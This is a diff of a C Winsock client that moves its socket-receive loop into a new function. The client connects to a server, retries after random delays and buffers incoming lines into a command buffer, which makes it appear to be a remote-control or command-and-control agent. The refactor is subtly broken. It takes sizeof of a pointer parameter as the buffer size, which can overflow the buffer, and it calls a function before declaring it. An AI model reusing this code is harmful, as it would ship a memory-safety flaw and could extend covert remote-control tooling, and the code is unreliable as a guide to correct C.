@@ -38,7 +38,25 @@ SOCKET connect_to_server() {
   
 }
 
-int process_buffered_data(int *recv_len, char *recv_buffer, SOCKET sock) {
+int process_incoming_byte_stream(SOCKET sock, char *recv_buffer, size_t *recv_len) {
+
+  int n = recv(sock, recv_buffer + *recv_len, sizeof(recv_buffer) - 1 - *recv_len, 0);
+
+  if (n > 0) {
+
+    *recv_len += n;
+    if (process_buffered_data(recv_len, recv_buffer, sock) < 0) {
+      return -1;
+    }
+
+  } else {
+      return -1;
+  }
+
+  return 0;
+}
+
+int process_buffered_data(size_t *recv_len, char *recv_buffer, SOCKET sock) {
 
   char *newline;
   char cmd[1024];
@@ -104,7 +122,6 @@ int main() {
 
     SOCKET sock = connect_to_server();
 
-
     if (sock == INVALID_SOCKET) {
       
       int sleep_time = 1 + rand() % delay;
@@ -123,24 +140,14 @@ int main() {
     int connection_alive = 1;
 
     char recv_buffer[1024];
-    int recv_len = 0;
+    size_t recv_len = 0;
     while (connection_alive) {
 
-      int n = recv(sock, recv_buffer + recv_len, sizeof(recv_buffer) - 1 - recv_len, 0);
-
-      if (n > 0) {
-
-        recv_len += n;
-        if (process_buffered_data(&recv_len, recv_buffer, sock) < 0) {
-          closesocket(sock);
-          connection_alive = 0;
-        }
-
-      } else {
-          closesocket(sock);
-          connection_alive = 0;
-          break;
+      if (process_incoming_byte_stream(sock, recv_buffer, &recv_len) < 0) {
+        closesocket(sock);
+        connection_alive = 0;
       }
+      
     }
   }
 
